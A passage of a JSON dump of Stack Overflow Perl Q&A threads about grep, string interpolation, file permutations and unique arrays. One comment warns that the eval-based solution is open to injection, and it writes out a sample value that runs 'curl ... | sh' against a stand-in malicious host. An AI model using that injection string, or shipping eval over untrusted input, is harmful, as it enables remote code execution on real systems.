prettyprint-override\"><code>1\n2\n3\n</code></pre>\n\n<h3>File2 contains</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>4\n5\n6\n</code></pre>\n\n<h3>File3 contains</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>7\n8\n9\n</code></pre>\n\n<p>If I wanted to print only those combinations then there are many answers that I could use. However, as the files contain more lines that I care type manually into the Perl script. I am building an array from each file, then I build an array ref of those arrays. Finally I am attempting to use <a href=\"https://metacpan.org/pod/List::Permutor\" rel=\"nofollow\"><code>List::Permutor</code></a> to print the combinations.</p>\n\n<p>The problem I am getting is that I am printing out the memory references, and I cannot figure out how to dereference the arrays inside of the <code>List::Permutor</code> call.</p>\n\n<h3>Perl code</h3>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use List::Permutor;\nuse warnings;\n\nopen (FILE, app_txt);\nchomp (@app = (&lt;FILE&gt;));\nclose (FILE);\n\nopen (FILE, att1_txt);\nchomp (@att1 = (&lt;FILE&gt;));\nclose (FILE);\n\nopen (FILE, att2_txt);\nchomp (@att2 = (&lt;FILE&gt;));\nclose (FILE);\n\nmy $permutor = List::Permutor-&gt;new( \\@app, \\@att1, \\@att2);\n\nwhile ( my @permutation = $permutor-&gt;next() ) {\n    print \"@permutation\\n\";\n}\n</code></pre>\n"}, {"tags": ["perl", "grep"], "comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 2, "creation_date": 1462573719, "post_id": 37082184, "comment_id": 61709318, "body": "This is almost the same Q as <a href=\"http://stackoverflow.com/q/37079760/5830574\">this one</a> posed 3hrs ago. If you are the same person I strongly recommend <b><i>not to double post</i></b> from different accounts. Else I recommend to look out for the very same questions already posted on SO."}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1462580488, "post_id": 37082184, "comment_id": 61710927, "body": "Rule of thumb: avoid using <code>$_</code> implicitly or explicitly for exactly this reason. <code>map</code> and <code>grep</code> are exceptions because its use is required."}], "answers": [{"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 5, "last_activity_date": 1462573583, "creation_date": 1462573583, "answer_id": 37082293, "question_id": 37082184, "link": "https://stackoverflow.com/questions/37082184/perl-script-grep/37082293#37082293", "title": "Perl script grep", "body": "<p>OK, the problem here is - <code>grep</code> sets <code>$_</code> too. So <code>grep { $_ } @array</code> will always give you every element in the array. </p>\n\n<p>At a basic level - you need to:</p>\n\n<pre><code>while ( my $line = &lt;&gt; ) { \n   chomp $line; \n   if ( grep { /^$line$/ } @todd ) { \n      #do something\n   }\n}\n</code></pre>\n\n<p>But I'd suggest instead that you might want to consider building a hash of your lines instead:</p>\n\n<pre><code>open( my $input, '&lt;', \"text.txt\" ) or die $!;\nmy %in_todd = map { $_ =&gt; 1 } &lt;$input&gt;;\nclose $input;\nwhile (&lt;&gt;) {\n   print if $in_todd{$_};\n}\n</code></pre>\n\n<p>Note - you might want to watch for trailing linefeeds. </p>\n"}], "owner": {"reputation": 3, "user_id": 6302304, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9251571f448d111ac9889cfab9510abb?s=128&d=identicon&r=PG&f=1", "display_name": "S. Gram", "link": "https://stackoverflow.com/users/6302304/s-gram"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 130, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1462810129, "creation_date": 1462572894, "last_edit_date": 1462810129, "question_id": 37082184, "link": "https://stackoverflow.com/questions/37082184/perl-script-grep", "title": "Perl script grep", "body": "<p>The script is printing the amount of input lines, I want it to print the amount of input lines that are present in another file</p>\n\n<pre><code>#!/usr/bin/perl -w\nopen(\"file\", \"text.txt\"); \n        @todd = &lt;file&gt;;         \n        close \"file\";\nwhile(&lt;&gt;){\n        if( grep( /^$_$/, @todd)){\n        #if( grep @todd, /^$_$/){\n                print $_;\n        }\n        print \"\\n\";\n}\n</code></pre>\n\n<p>if for example file contains</p>\n\n<pre><code>1\n3\n4\n5\n7\n</code></pre>\n\n<p>and the input file that will be read from contains</p>\n\n<pre><code>1\n2\n3\n4\n5\n6\n7\n8\n9\n</code></pre>\n\n<p>I would want it to print 1,3,4,5 and 7\nbut 1-9 are being printed instead</p>\n\n<p>UPDATE******\nThis is my code now and I am getting this error\nreadline() on closed filehandle todd at ./may6test.pl line 3.</p>\n\n<pre><code>#!/usr/bin/perl -w\nopen(\"todd\", \"&lt;text.txt\");\n        @files = &lt;todd&gt;;         #file looking into\n        close \"todd\";\nwhile( my $line = &lt;&gt; ){\n        chomp $line;\n        if ( grep( /^$line$/, @files) ) {\n                print $_;\n        }\n        print \"\\n\";\n}\n</code></pre>\n\n<p>which makes no sense to me because I have this other script that is basically doing the same thing</p>\n\n<pre><code>#!/usr/bin/perl -w\nopen(\"file\", \"&lt;text2.txt\");    #\n        @file = &lt;file&gt;;         #file looking into\n        close \"file\";           #\nwhile(&lt;&gt;){\n        $temp = $_;\n        $temp =~ tr/|/\\t/;      #puts tab between name and id\n        my ($name, $number1, $number2) = split(\"\\t\", $temp);\n        if ( grep( /^$number1$/, @file) ) {\n                print $_;\n        }\n}\nprint \"\\n\";\n</code></pre>\n"}, {"tags": ["perl", "hash", "interpolation", "string-interpolation"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 4, "creation_date": 1462565360, "post_id": 37080597, "comment_id": 61705985, "body": "The interpolation happens when the hash is initialized (<code>my %h =</code>), not when it&#39;s accessed, so <code>$va</code> is still 1 and <code>$vb</code> is 2. This seems like an <a href=\"http://meta.stackexchange.com/q/66377/234299\">XY problem</a>, though...can you please explain more about what you&#39;re trying to do?"}, {"owner": {"reputation": 9, "user_id": 6258950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f01e269bc8a3998e281365df428bd724?s=128&d=identicon&r=PG&f=1", "display_name": "Hannes Brockmann", "link": "https://stackoverflow.com/users/6258950/hannes-brockmann"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462567743, "post_id": 37080597, "comment_id": 61707122, "body": "@ThisSuitIsBlackNot Yes You are right. I changed now the double quotas from ... &#39;a&#39; =&gt; &quot; ... &quot; to &#39;a&#39; =&gt; &#39; ... &#39;. The hash is now not interpolatable and so initialized without interpolation. But the printout gives: This is the value of variable \\$va: $va This is the value of variable \\$vb: $vb Also not interpolated - why?"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462568013, "post_id": 37080597, "comment_id": 61707241, "body": "At first glance I think <code>eval</code> is a keyword here..."}, {"owner": {"reputation": 9, "user_id": 6258950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f01e269bc8a3998e281365df428bd724?s=128&d=identicon&r=PG&f=1", "display_name": "Hannes Brockmann", "link": "https://stackoverflow.com/users/6258950/hannes-brockmann"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462569448, "post_id": 37080597, "comment_id": 61707860, "body": "@ThisSuitIsBlackNot,@perl-dog I&#39;ve tried to eval() after getting the strings out of the hash, tried to eval() the print in several variants - but nothing is working for me."}], "answers": [{"comments": [{"owner": {"reputation": 9, "user_id": 6258950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f01e269bc8a3998e281365df428bd724?s=128&d=identicon&r=PG&f=1", "display_name": "Hannes Brockmann", "link": "https://stackoverflow.com/users/6258950/hannes-brockmann"}, "edited": false, "score": 0, "creation_date": 1462572428, "post_id": 37081926, "comment_id": 61708926, "body": "I found a solution by myself, but this is a really nice looking one. Testing it I got this error: Can&#39;t use string (&quot;This is the value of variable \\$&quot;...) as a subroutine ref while &quot;strict refs&quot; in use .."}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "reply_to_user": {"reputation": 9, "user_id": 6258950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f01e269bc8a3998e281365df428bd724?s=128&d=identicon&r=PG&f=1", "display_name": "Hannes Brockmann", "link": "https://stackoverflow.com/users/6258950/hannes-brockmann"}, "edited": false, "score": 0, "creation_date": 1462573727, "post_id": 37081926, "comment_id": 61709322, "body": "then you forgot to add the <code>sub { ... }</code> around the strings"}], "tags": [], "owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "is_accepted": false, "score": 2, "last_activity_date": 1462571446, "creation_date": 1462571446, "answer_id": 37081926, "question_id": 37080597, "link": "https://stackoverflow.com/questions/37080597/interpolation-of-hashed-format-string/37081926#37081926", "title": "interpolation of hashed format string", "body": "<p>To delay the interpolation, the easiest way is to use anonymous subs:</p>\n\n<pre><code>    my $va=1;\n    my $vb=2;\n    my $fa=\"\";\n    my $fb=\"\";\n    my %h=( 'format' =&gt; { 'a' =&gt; sub { \"This is the value of variable \\$va: $va\" },\n                          'b' =&gt; sub { \"This is the value of variable \\$vb: $vb\" },\n                        },\n            'values' =&gt; { 'a' =&gt; \"value A\",\n                          'b' =&gt; \"value B\",\n                        }\n          );\n    $fa=$h{'format'}-&gt;{'a'};\n    $fb=$h{'format'}-&gt;{'b'};\n    $va=$h{'values'}-&gt;{'a'};\n    $vb=$h{'values'}-&gt;{'b'};\n    print $fa-&gt;() . \"&lt;br/&gt;\\n\";\n    print $fb-&gt;() . \"&lt;br/&gt;\\n\";\n    $va=3;\n    $vb=4;\n    print $fa-&gt;() . \"&lt;br/&gt;\\n\";\n    print $fb-&gt;() . \"&lt;br/&gt;\\n\";\n</code></pre>\n\n<p>That said, use a templating system instead.</p>\n"}, {"comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1462572672, "post_id": 37081960, "comment_id": 61709005, "body": "<code>printf</code> is to templating what <code>vi</code> is to integrated development environments!"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1462573193, "post_id": 37081960, "comment_id": 61709153, "body": "@mob :-P you are right, it&#39;s not particularly <i>state of the [intentionally left blank]</i> but this could have solved the OP&#39;s problem. However, I&#39;m happy he found a far better solution."}], "tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": false, "score": 1, "last_activity_date": 1462571628, "creation_date": 1462571628, "answer_id": 37081960, "question_id": 37080597, "link": "https://stackoverflow.com/questions/37080597/interpolation-of-hashed-format-string/37081960#37081960", "title": "interpolation of hashed format string", "body": "<p>As @ThisSuitIsBlackNot already noted, this might me an XY problem. Perhaps <code>[s]printf</code> might help you:</p>\n\n<pre><code>my %h=( 'format' =&gt; { 'a' =&gt; \"This is the value of variable \\$va: %s\",\n                      'b' =&gt; \"This is the value of variable \\$vb: %s\"\n                    },\n        'values' =&gt; { 'a' =&gt; \"value A\",\n                      'b' =&gt; \"value B\"\n                    }\n      );\n\nprintf( $h{format}{a}, $h{values}{a} );\n</code></pre>\n\n<p>This is equivalent to</p>\n\n<pre><code>printf( \"This is the value of variable \\$va: %s\", 'value A' );\n</code></pre>\n\n<p>Which gives:</p>\n\n<pre><code>This is the value of variable $va: value A\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 1, "creation_date": 1462572216, "post_id": 37081992, "comment_id": 61708855, "body": "Nice. So I wasn&#39;t completely wrong with that <code>eval</code> guess ;-) Thanks for showing your solution so other people can benefit."}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 3, "creation_date": 1462573320, "post_id": 37081992, "comment_id": 61709192, "body": "Use a real templating system before somebody sets <code>$h{&quot;values&quot;}{&quot;a&quot;}</code> to <code>&quot;;system(&#39;curl http:&#47;&#47;maliciouscode.com&#47;script19.php | sh&#39;);&quot;Don&#39;t worry. Everything is ok</code>"}], "tags": [], "owner": {"reputation": 9, "user_id": 6258950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f01e269bc8a3998e281365df428bd724?s=128&d=identicon&r=PG&f=1", "display_name": "Hannes Brockmann", "link": "https://stackoverflow.com/users/6258950/hannes-brockmann"}, "is_accepted": false, "score": 0, "last_activity_date": 1462571809, "creation_date": 1462571809, "answer_id": 37081992, "question_id": 37080597, "link": "https://stackoverflow.com/questions/37080597/interpolation-of-hashed-format-string/37081992#37081992", "title": "interpolation of hashed format string", "body": "<p>I found a solution at <a href=\"http://www.perlmonks.org/?node_id=408346\" rel=\"nofollow\">http://www.perlmonks.org/?node_id=408346</a></p>\n\n<p>the strings have to be 'requoted':</p>\n\n<pre><code>    sub quote { qq!\"$_[0]\"! } # Use something more sophisticated which escapes properly.\n\n    my $va=1;\n    my $vb=2;\n    my $fa=\"\";\n    my $fb=\"\";\n\n    my %h=( 'format' =&gt; { 'a' =&gt; 'This is the value of variable \\$va: ${va}',\n                          'b' =&gt; 'This is the value of variable \\$vb: ${vb}'\n                        },\n            'values' =&gt; { 'a' =&gt; 'value A',\n                          'b' =&gt; 'value B'\n                        }\n          );\n    $fa=$h{'format'}-&gt;{'a'};\n    $fb=$h{'format'}-&gt;{'b'};\n    $va=$h{'values'}-&gt;{'a'};\n    $vb=$h{'values'}-&gt;{'b'};\n    print eval(quote($fa)).\"&lt;br/&gt;\\n\";\n    print eval(quote($fb)).\"&lt;br/&gt;\\n\";\n    $va=3;\n    $vb=4;\n    print eval(quote($fa)).\"&lt;br/&gt;\\n\";\n    print eval(quote($fb)).\"&lt;br/&gt;\\n\";\n</code></pre>\n\n<p>Now the printout is like wanted:</p>\n\n<pre><code>    This is the value of variable $va: value A\n    This is the value of variable $vb: value B\n    This is the value of variable $va: 3\n    This is the value of variable $vb: 4\n</code></pre>\n\n<p>cheers.</p>\n"}], "owner": {"reputation": 9, "user_id": 6258950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f01e269bc8a3998e281365df428bd724?s=128&d=identicon&r=PG&f=1", "display_name": "Hannes Brockmann", "link": "https://stackoverflow.com/users/6258950/hannes-brockmann"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1462571809, "creation_date": 1462565218, "question_id": 37080597, "link": "https://stackoverflow.com/questions/37080597/interpolation-of-hashed-format-string", "title": "interpolation of hashed format string", "body": "<p>I am working on a perl cgi-script.\nIt should handle some kind of database where print layouts and the values to print are stored in a hash. Here comes my code snippet:</p>\n\n<pre><code>    my $va=1;\n    my $vb=2;\n    my $fa=\"\";\n    my $fb=\"\";\n    my %h=( 'format' =&gt; { 'a' =&gt; \"This is the value of variable \\$va: $va\",\n                          'b' =&gt; \"This is the value of variable \\$vb: $vb\"\n                        },\n            'values' =&gt; { 'a' =&gt; \"value A\",\n                          'b' =&gt; \"value B\"\n                        }\n          );\n    $fa=$h{'format'}-&gt;{'a'};\n    $fb=$h{'format'}-&gt;{'b'};\n    $va=$h{'values'}-&gt;{'a'};\n    $vb=$h{'values'}-&gt;{'b'};\n    print \"$fa&lt;br/&gt;\\n\";\n    print \"$fb&lt;br/&gt;\\n\";\n    $va=3;\n    $vb=4;\n    print \"$fa&lt;br/&gt;\\n\";\n    print \"$fb&lt;br/&gt;\\n\";\n</code></pre>\n\n<p>Until now I got only this (wrong) printout:</p>\n\n<pre><code>   This is the value of variable $va: 1\n   This is the value of variable $vb: 2\n   This is the value of variable $va: 1\n   This is the value of variable $vb: 2\n</code></pre>\n\n<p>What I do expect is:</p>\n\n<pre><code>   This is the value of variable $va: value A\n   This is the value of variable $vb: value B\n   This is the value of variable $va: 3\n   This is the value of variable $vb: 4\n</code></pre>\n\n<p>What could be the reason that the interpolation of the format-strings stored in the hash does not work?</p>\n"}, {"tags": ["perl", "grep"], "comments": [{"owner": {"reputation": 2414, "user_id": 5379657, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ab4a9ac2ee2c7a27f5d976d6a787970?s=128&d=identicon&r=PG&f=1", "display_name": "Jeff Y", "link": "https://stackoverflow.com/users/5379657/jeff-y"}, "edited": false, "score": 0, "creation_date": 1462562269, "post_id": 37079760, "comment_id": 61704520, "body": "Print out <code>$arrayTemp[1]</code> and you&#39;ll see what the problem is."}, {"owner": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "edited": false, "score": 6, "creation_date": 1462562691, "post_id": 37079760, "comment_id": 61704711, "body": "you&#39;ve slurped in the entire file contents into <code>@file</code> in the third line of your script, but then you&#39;re attempting to read more lines from it again in your grep statement.  At that point, <code>&lt;file&gt;</code> has no further contents to return to you, and it&#39;s just returning <code>undef</code> every time.  If you&#39;d enable <code>use warnings;</code> in your code, Perl would have told you that."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "reply_to_user": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "edited": false, "score": 1, "creation_date": 1462566475, "post_id": 37079760, "comment_id": 61706526, "body": "@PaulL Your point to use <code>warnings</code> (and <code>strict</code>, even though you didn&#39;t say it) is well-taken, but this code wouldn&#39;t actually produce any warnings. We don&#39;t know what the command line arguments are in this case, so it&#39;s hard to say what the null filehandle would do. But even a <code>while (&lt;file&gt;)</code> would do nothing; the code simply wouldn&#39;t enter the loop."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462578323, "post_id": 37079760, "comment_id": 61710475, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/37082184/perl-script-grep\">Perl script grep</a>"}, {"owner": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1462796140, "post_id": 37079760, "comment_id": 61772146, "body": "@MattJacob you are absolutely correct.  My apologies.  I was screwing up context - I wasn&#39;t taking into account that <code>grep</code> forced a list context on the <code>&lt;&gt;</code> operator.  If it had worked in scalar context, <i>then</i> it would have returned <code>undef</code>, which Perl would certainly warn about using.  As it is, though, (and assuming the four lines with just numbers are the contents of <code>textIDs.txt</code> and the other file is passed on the command line), the <code>&lt;file&gt;</code> will simply return an empty list, which grep is perfectly happy to use without warnings.  Thank you for the correction."}], "answers": [{"tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": false, "score": 3, "last_activity_date": 1462567350, "creation_date": 1462567350, "answer_id": 37081094, "question_id": 37079760, "link": "https://stackoverflow.com/questions/37079760/my-perl-script-isnt-working-i-have-a-feeling-its-the-grep-command/37081094#37081094", "title": "My perl script isn&#39;t working, I have a feeling it&#39;s the grep command", "body": "<p>There are some issues in your script. </p>\n\n<ol>\n<li><strong><em>Always</em></strong> include <code>use strict;</code> and <code>use warnings;</code>.\nThis would have told you about odd things in your script in advance.</li>\n<li>Never use barewords as filehandles as they are global identifiers. Use three-parameter-open\ninstead: <code>open( my $fh, '&lt;', 'testIds.txt');</code></li>\n<li><code>use autodie;</code> or check whether the opening worked.</li>\n<li>You read and store <code>testIds.txt</code> into the array <code>@file</code> but later on (in your <code>grep</code>) you are\nagain trying to read from that file(handle) (with <code>&lt;file&gt;</code>). As @PaulL said, this will always\ngive <code>undef</code> (false) because the file was already read.</li>\n<li>Replacing <code>|</code> with tabs and then splitting at tabs is not neccessary. You can split at the \ntabs and pipes at the same time as well (assuming \"John|7791  154\" is <em>really</em> \"John|7791\\t154\").</li>\n<li>Your talking about \"input file\" and \"in file\" without exactly telling which is which.\nI assume your \"textIds.txt\" is the one with only the numbers and the other <em>input file</em> is the\none read from STDIN (with the <code>|</code>'s in it).</li>\n</ol>\n\n<p>With this in mind your script could be written as:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\n# Open 'textIds.txt' and slurp it into the array @file:\nopen( my $fh, '&lt;', 'textIds.txt') or die \"cannot open file: $!\\n\";\nmy @file = &lt;$fh&gt;;\nclose($fh);\n\n# iterate over STDIN and compare with lines from 'textIds.txt':\nwhile( my $line = &lt;&gt;) {\n    # split \"John|7791\\t154\" into (\"John\", \"7791\", \"154\"):\n    my ($name, $number1, $number2) = split(/\\||\\t/, $line);\n\n    # compare $number1 to each member of @file and print if found:\n    if ( grep( /$number1/, @file) ) {\n        print $line;\n    }\n}\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user6131143"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 135, "favorite_count": 1, "answer_count": 1, "score": 2, "last_activity_date": 1462567350, "creation_date": 1462561718, "question_id": 37079760, "link": "https://stackoverflow.com/questions/37079760/my-perl-script-isnt-working-i-have-a-feeling-its-the-grep-command", "title": "My perl script isn&#39;t working, I have a feeling it&#39;s the grep command", "body": "<p>I'm trying for search in the one file for instances of the\nnumber and post if the other file contains those numbers</p>\n\n<pre><code>#!/usr/bin/perl\nopen(file, \"textIds.txt\"); #\n        @file = &lt;file&gt;;         #file looking into\n#        close file;            #\nwhile(&lt;&gt;){\n        $temp = $_;\n        $temp =~ tr/|/\\t/;      #puts tab between name and id\n        @arrayTemp = split(\"\\t\", $temp);\n        @found=grep{/$arrayTemp[1]/} &lt;file&gt;;\n        if (defined $found[0]){\n        #if (grep{/$arrayTemp[1]/} &lt;file&gt;){\n                print $_;\n        }\n        @found=();\n}\nprint \"\\n\";\nclose file;\n\n#the input file lines have the format of \n#John|7791  154\n#Smith|5432 290\n#Conor|6590 897\n\n#And in the file the format is \n#5432\n#7791\n#6590\n#23140\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462557478, "post_id": 37077266, "comment_id": 61702074, "body": "<code>perl -E &#39;say for grep { &#47;^bob-\\d+-\\d+$&#47; &amp;&amp; !$s{$_}++ } split &quot; &quot;, shift&#39; &#39;bob-2-4 asdfasdfasdf bob-2-4 asdfasdf bob-3-1&#39;</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462558392, "post_id": 37077266, "comment_id": 61702577, "body": "Or if you want an array (not a one-liner) then <code>my %s; my @unique = grep { &#47;^bob-\\d+-\\d+$&#47; &amp;&amp; !%s{$_}++ } split &#39; &#39;, $str;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1462552851, "post_id": 37077349, "comment_id": 61699531, "body": "You could also use <code>uniq</code> from List::MoreUtils, which does the same thing, but is syntactically cleaner."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1462552946, "post_id": 37077349, "comment_id": 61699584, "body": "Don&#39;t see the point of using the solutions that don&#39;t preserve the order, especially since they create a copy of all the unique values for nothing."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 1, "last_activity_date": 1462552810, "last_edit_date": 1462552810, "creation_date": 1462552424, "answer_id": 37077349, "question_id": 37077266, "link": "https://stackoverflow.com/questions/37077266/what-is-the-best-way-to-create-a-unique-array-of-values-from-a-string/37077349#37077349", "title": "What is the best way to create a unique array of values from a string?", "body": "<p>If you're talking about uniques, the tool for the job is a hash.</p>\n\n<p>You can do:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nmy $str = \"bob-2-4 asdfasdfasdf bob-2-4 asdfasdf bob-3-1\";\nmy %unique = map { $_ =&gt; 1 } $str =~ m/(bob-\\d-\\d)/g;\nprint keys %unique;\n</code></pre>\n\n<p>As a one liner, straight into your array, you could:</p>\n\n<pre><code>my @unique = keys %{{map { $_ =&gt; 1 } $str =~ m/(bob-\\d-\\d)/g}};\n</code></pre>\n\n<p>This does approximately the same thing - use <code>map</code> to construct the hash, and then <code>keys</code> to extract the unique values. Note - <code>keys</code> doesn't return a defined order. </p>\n\n<p>If ordering is important, you could also use <code>grep</code>, but you'll still need a hash:</p>\n\n<pre><code>my $str = \"bob-2-4 asdfasdfasdf bob-2-4 asdfasdf bob-3-1\";\nmy %seen;\nmy @unique = grep { not $seen{$_}++ } $str =~ m/(bob-\\d-\\d)/g;\nprint @unique;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, 